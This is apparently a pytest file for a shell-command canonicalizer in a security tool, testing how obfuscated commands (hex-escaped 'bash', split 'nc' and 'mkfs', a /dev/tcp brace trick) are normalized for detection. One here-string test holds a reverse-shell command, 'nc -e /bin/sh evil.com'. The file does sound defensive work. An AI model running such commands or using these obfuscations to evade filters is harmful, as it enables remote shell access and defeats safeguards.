"""Tests for command canonicalization module."""

import os

import pytest
from unittest.mock import patch

from aegish.canonicalizer import (
    CanonicalResult,
    canonicalize,
    _resolve_ansi_c_quotes,
    _normalize_quotes,
    _convert_backticks,
    _expand_braces,
    _resolve_globs,
    _extract_here_strings,
)


class TestAnsiCQuotes:
    """Tests for ANSI-C $'...' quote resolution."""

    def test_hex_escape(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\x62\x61\x73\x68'", annotations)
        assert result == "bash"

    def test_octal_escape(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\142\141\163\150'", annotations)
        assert result == "bash"

    def test_unicode_4digit(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\u0041'", annotations)
        assert result == "A"

    def test_unicode_8digit(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\U00000041'", annotations)
        assert result == "A"

    def test_named_escapes(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\n\t\\\''", annotations)
        assert result == "\n\t\\'"

    def test_no_ansi_c_passthrough(self):
        annotations = []
        result = _resolve_ansi_c_quotes("echo hello", annotations)
        assert result == "echo hello"

    def test_mixed_text_and_ansi(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"echo $'\x68\x69'", annotations)
        assert result == "echo hi"

    def test_partial_annotation(self):
        """Unmatched $' sequences get ANSI_C_PARTIAL annotation."""
        annotations = []
        _resolve_ansi_c_quotes("$'incomplete", annotations)
        assert "ANSI_C_PARTIAL" in annotations


class TestQuoteNormalization:
    """Tests for shell quote normalization."""

    def test_empty_quotes_removed(self):
        annotations = []
        result = _normalize_quotes('ba""sh', annotations)
        assert result == "bash"

    def test_backslash_quoting(self):
        annotations = []
        result = _normalize_quotes(r"n\c", annotations)
        assert result == "nc"

    def test_mixed_quoting(self):
        annotations = []
        result = _normalize_quotes("'mk'fs", annotations)
        assert result == "mkfs"

    def test_dollar_sign_skipped(self):
        """Commands with $ are not normalized (would change semantics)."""
        annotations = []
        result = _normalize_quotes("echo $HOME", annotations)
        assert result == "echo $HOME"

    def test_pipe_skipped(self):
        annotations = []
        result = _normalize_quotes("echo hi | grep h", annotations)
        assert result == "echo hi | grep h"

    def test_parse_failure_annotated(self):
        annotations = []
        result = _normalize_quotes("echo 'unterminated", annotations)
        assert "QUOTE_NORM_FAILED" in annotations
        assert result == "echo 'unterminated"


class TestBacktickConversion:
    """Tests for backtick → $() conversion."""

    def test_simple_backtick(self):
        result = _convert_backticks("`echo hello`")
        assert result == "$(echo hello)"

    def test_backtick_in_context(self):
        result = _convert_backticks("echo `whoami`@host")
        assert result == "echo $(whoami)@host"

    def test_multiple_backticks(self):
        result = _convert_backticks("`cmd1` && `cmd2`")
        assert result == "$(cmd1) && $(cmd2)"

    def test_no_backticks_passthrough(self):
        result = _convert_backticks("echo hello")
        assert result == "echo hello"


class TestBraceExpansion:
    """Tests for brace expansion."""

    def test_simple_brace(self):
        annotations = []
        text, variants = _expand_braces("echo {a,b}", annotations)
        assert text == "echo a"
        assert "echo b" in variants

    def test_path_brace(self):
        annotations = []
        text, variants = _expand_braces("/dev/tc{p,x}/host/port", annotations)
        assert text == "/dev/tcp/host/port"
        assert "/dev/tcx/host/port" in variants

    def test_no_braces_passthrough(self):
        annotations = []
        text, variants = _expand_braces("echo hello", annotations)
        assert text == "echo hello"
        assert variants == []

    def test_limit_exceeded_annotation(self):
        """Large brace expansion annotates but keeps all variants."""
        annotations = []
        # {1..100} generates 100 variants
        text, variants = _expand_braces("echo {1..100}", annotations)
        assert any("BRACE_LIMIT_EXCEEDED" in a for a in annotations)
        assert len(variants) >= 64


class TestGlobResolution:
    """Tests for glob resolution."""

    def test_existing_glob_resolves(self, tmp_path):
        """Glob matching existing files resolves to paths."""
        (tmp_path / "test.txt").write_text("hello")
        pattern = str(tmp_path / "*.txt")
        result = _resolve_globs(f"cat {pattern}")
        assert str(tmp_path / "test.txt") in result

    def test_no_match_passthrough(self):
        """Glob with no matches keeps original pattern."""
        result = _resolve_globs("cat /nonexistent_dir_xyz_123/*.txt")
        assert "/nonexistent_dir_xyz_123/*.txt" in result

    def test_no_globs_passthrough(self):
        result = _resolve_globs("echo hello")
        assert result == "echo hello"


class TestHereStringExtraction:
    """Tests for here-string (<<<) extraction."""

    def test_single_quoted(self):
        result = _extract_here_strings("bash <<<'nc -e /bin/sh evil.com'")
        assert len(result) == 1
        assert "nc -e /bin/sh evil.com" in result[0]

    def test_double_quoted(self):
        result = _extract_here_strings('bash <<<"some content"')
        assert len(result) == 1
        assert "some content" in result[0]

    def test_unquoted(self):
        result = _extract_here_strings("bash <<<word")
        assert len(result) == 1
        assert "word" in result[0]

    def test_no_here_strings(self):
        result = _extract_here_strings("echo hello")
        assert result == []


class TestCanonicalizeIntegration:
    """Integration tests for the full canonicalize() pipeline."""

    def test_simple_command_unchanged(self):
        result = canonicalize("echo hello")
        assert result.text == "echo hello"
        assert result.original == "echo hello"
        assert result.variants == []
        assert result.here_strings == []

    def test_ansi_c_plus_backtick(self):
        """Multiple transforms chain correctly."""
        result = canonicalize(r"`echo $'\x68\x69'`")
        # ANSI-C resolves first: $'\x68\x69' → hi
        # Then backtick converts: `echo hi` → $(echo hi)
        assert "$(echo hi)" in result.text

    def test_brace_expansion_populates_variants(self):
        result = canonicalize("echo {a,b,c}")
        # Primary text is first variant
        assert result.text == "echo a"
        assert "echo b" in result.variants
        assert "echo c" in result.variants

    def test_here_string_extracted(self):
        result = canonicalize("bash <<<'payload'")
        assert len(result.here_strings) == 1
        assert "payload" in result.here_strings[0]

    def test_quote_normalization_removes_empty(self):
        result = canonicalize('ba""sh')
        assert result.text == "bash"

    def test_preserves_variable_expansion(self):
        """$ variables are not broken by quote normalization."""
        result = canonicalize("echo $HOME")
        assert "$HOME" in result.text
